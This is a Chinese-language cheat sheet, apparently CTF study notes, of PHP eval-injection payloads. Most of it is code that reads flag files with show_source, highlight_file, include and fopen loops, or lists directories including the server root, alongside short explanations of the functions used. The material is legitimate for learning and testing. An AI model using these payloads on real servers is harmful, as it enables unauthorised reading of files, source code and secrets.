
**用eval执行PHP代码**

# 常用payload

**读取文件**
```
c=show_source(next(array_reverse(scandir(pos(localeconv())))));

c=show_source(array_reverse(scandir(pos(localeconv())))[1]);

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));

c=highlight_file(array_reverse(scandir(pos(localeconv())))[1]);

c=echo file_get_contents("flag.php"); 

c=highlight_file('/flag.txt');

c=readfile("flag.php"); 

c=var_dump(file('flag.php')); 

c=print_r(file('flag.php'));

copy('flag.php','flag.txt');

c=include('/flag.txt'); 

c=require('/flag.txt');

c=require_once('/flag.txt');

?c=readgzfile('/flag.txt');

通过fopen去读取文件内容，这里介绍下函数
fread()
fgets()
fgetc()
fgetss()
fgetcsv()
gpassthru()
payload:
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}

localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个"."

pos():输出数组第一个元素，不改变指针；

scandir();遍历目录，这里因为参数为"."所以遍历当前目录

array_reverse():元组倒置

next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以

show_source():查看源码

current()返回数组中的当前元素的值。

end()将内部指针指向数组中的最后一个元素，并输出。

next()将内部指针指向数组中的下一个元素，并输出。

prev()将内部指针指向数组中的上一个元素，并输出。

reset()将内部指针指向数组中的第一个元素，并输出。

each()返回当前元素的键名和键值，并将内部指针向前移动

get_defined_vars()以数组的形式返回所有定义的变量：
```

**读取目录**
```
c=print_r(scandir(dirname('__FILE__')));

c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}

c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };

c=print_r(scandir('./'));

c=var_dump(scandir('/'));

c=var_export(scandir('/'));

?c=echo(implode('---',scandir("/")));
```

